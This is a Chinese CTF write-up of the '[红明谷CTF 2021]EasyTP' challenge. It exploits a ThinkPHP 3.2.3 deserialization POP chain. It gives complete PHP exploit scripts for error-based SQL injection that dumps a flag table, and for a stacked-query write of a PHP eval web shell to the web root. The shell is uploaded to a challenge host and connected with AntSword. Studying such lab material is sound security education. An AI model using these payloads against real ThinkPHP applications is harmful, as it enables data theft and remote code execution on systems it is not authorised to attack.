---
title: '[红明谷CTF 2021]EasyTP'
date: 2024-11-24 16:41:50
tags: thinkphp
categories: 刷题笔记
---

## [红明谷CTF 2021]EasyTP

我们发现有源码泄露，下载/www.zip

我们发现thinkphp版本是3.2.3版本的

我们上网查链子 [ThinkPHP v3.2.* （SQL注入&文件读取）反序列化POP链 (f5.pm)](https://f5.pm/go-53579.html)

注意在源码中，控制器存在反序列化，我们以这个入手

![image-20241128193517682](C:/Users/11/AppData/Roaming/Typora/typora-user-images/image-20241128193517682.png)

在buu中，database=test，password=root

## 方法一：报错注入

我们使用报错注入

```php
<?php
namespace Think\Db\Driver{
    use PDO;
    class Mysql{
        protected $options = array(
            PDO::MYSQL_ATTR_LOCAL_INFILE => true // 开启才能读取文件
        );
        protected $config = array(
            "debug"    => true,
            "database" => "test", // 可换成任一存在的库
            "hostname" => "127.0.0.1",
            "hostport" => "3306",
            "charset"  => "utf8",
            "username" => "root",
            "password" => "root" // BUU环境密码为root
        );
    }
}
namespace Think\Image\Driver{
    use Think\Session\Driver\Memcache;
    class Imagick{
        private $img;
        public function __construct(){
            $this->img = new Memcache();
        }
    }
}
namespace Think\Session\Driver{
    use Think\Model;
    class Memcache{
        protected $handle;
        public function __construct(){
            $this->handle = new Model();
        }
    }
}
namespace Think{
    use Think\Db\Driver\Mysql;
    class Model{
        protected $options = array();
        protected $pk;
        protected $data = array();
        protected $db = null;
        public function __construct(){
            $this->db = new Mysql();
            $this->options['where'] = '';
            $this->pk = 'id';
            $this->data[$this->pk] = array(
                //查看数据库名称
                // "table" => "mysql.user where updatexml(1,concat(0x7e,mid((select(group_concat(schema_name))from(information_schema.schemata)),30),0x7e),1)#",
                //数据库名称：'~information_schema,mysql,performance_schema,sys,test~'
                //一次能够读取的长度有限，分两次读取数据  使用mid函数分开读取

                //查表名
                // "table" => "mysql.user where updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0x7e),1)#",
                // ~flag,users~

                // 查列名
                //"table" => "mysql.user where updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')),0x7e),1)#",
                //~flag~

                //查字段值
                "table" => "mysql.user where updatexml(1,concat(0x7e,mid((select`*`from`flag`),1),0x7e),1)#",
                "where" => "1=1"
                
            );
        }
    }
}
namespace {
    echo base64_encode(serialize(new Think\Image\Driver\Imagick()));
}


```

其中报错注入的部分，要注意update最多只能显示32为，可以使用substr或者reverse来搭配使用

而师傅的wp采用了mid()函数来进行部分截取

```
mid(str, start, length)
str：要提取子字符串的原始字符串。
start：开始提取的位置。注意，MySQL 中的位置是基于 1 的索引，即第一个字符的位置为 1。如果 start 是负数，则表示从字符串的末尾开始计算位置。
length：可选参数，表示要提取的子字符串的长度。如果省略，则提取从 start 位置到字符串结尾的所有字符。
```

利用控制器中的`php://input`进行post传入数据

我们运行脚本，将得到的值进行post传参，得到部分flag

![image-20241128194934442](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411281949503.png)

我们查询后半段flag

```
mysql.user where updatexml(1,concat(0x7e,mid((select`*`from`flag`),15),0x7e),1)#
```

![image-20241128195043988](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411281950157.png)

拼接起来就得到完整的flag了

## 解法二：开堆叠写shell

参考payload:[红明谷 CTF2021 Web部分 WriteUp – glzjin (zhaoj.in)](https://www.zhaoj.in/read-6859.html#flag-3)

```php
<?php
namespace Think\Db\Driver{
    use PDO;
    class Mysql{
        protected $options = array(
            PDO::MYSQL_ATTR_LOCAL_INFILE => true,    //读取本地文件~
            PDO::MYSQL_ATTR_MULTI_STATEMENTS => true,    //把堆叠开了~
        );
        protected $config = array(
            "debug"    => 1,
            "database" => "test",//任意一个存在的数据库
            "hostname" => "127.0.0.1",
            "hostport" => "3306",
            "charset"  => "utf8",
            "username" => "root",
            "password" => "root"
        );
    }
}
namespace Think\Image\Driver{
    use Think\Session\Driver\Memcache;
    class Imagick{
        private $img;
        public function __construct(){
            $this->img = new Memcache();
        }
    }
}
namespace Think\Session\Driver{
    use Think\Model;
    class Memcache{
        protected $handle;
        public function __construct(){
            $this->handle = new Model();
        }
    }
}
namespace Think{
    use Think\Db\Driver\Mysql;
    class Model{
        protected $options   = array();
        protected $pk;
        protected $data = array();
        protected $db = null;
        public function __construct(){
            $this->db = new Mysql();
            $this->options['where'] = '';
            $this->pk = 'id';
            $this->data[$this->pk] = array(
                "table" => "mysql.user where 1=1;select '<?php eval(\$_POST[1]);?>' into outfile '/var/www/html/shell.php';#",
                "where" => "1=1"
            );
        }
    }
}
namespace {
    echo base64_encode(serialize(new Think\Image\Driver\Imagick()));


    $curl = curl_init();
    curl_setopt_array($curl, array(
        CURLOPT_URL => "http://60255871-6897-49ef-9d6c-884e6aa201d0.node4.buuoj.cn:81/index.php/Home/Index/test",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => "",
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => 30,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => "POST",
        CURLOPT_POSTFIELDS => base64_encode(serialize(new Think\Image\Driver\Imagick())),
        CURLOPT_HTTPHEADER => array(
            "Postman-Token: 348e180e-5893-4ab4-b1d4-f570d69f228e",
            "cache-control: no-cache"
        ),
    ));
    $response = curl_exec($curl);
    $err = curl_error($curl);
    curl_close($curl);
    if ($err) {
        echo "cURL Error #:" . $err;
    } else {
        echo $response;
    }
}

```

我们将得到的值进行上传，访问/shell用蚁剑进行连接

![image-20241128200358295](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411282003336.png)

我们查看根目录，发现flag是插入数据库的

flag.sh

![image-20241128200441276](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411282004302.png)

start.sh

![image-20241128200503126](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411282005166.png)

根据这个shell，我们可以直接连接数据库，数据库类型选择MYSQLI

![image-20241128201011372](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411282010407.png)

获取flag

![image-20211231233620524](https://i-blog.csdnimg.cn/blog_migrate/de66c924bf574707364ca01fb9a1cc96.png)



参考：

[BUUOJ\]红明谷CTF2021复现 | tyskillのBlog](https://tyskill.github.io/posts/hmgctf2021/)

[红明谷 CTF2021 Web部分 WriteUp – glzjin (zhaoj.in)](https://www.zhaoj.in/read-6859.html#flag-3)

[GKCTF&红明谷 部分Web 题解 – Crispr –热爱技术和生活 (crisprx.top)](https://www.crisprx.top/archives/412#CTF_2021EasyTP)

[allyshka/Rogue-MySql-Server](https://github.com/allyshka/Rogue-MySql-Server)
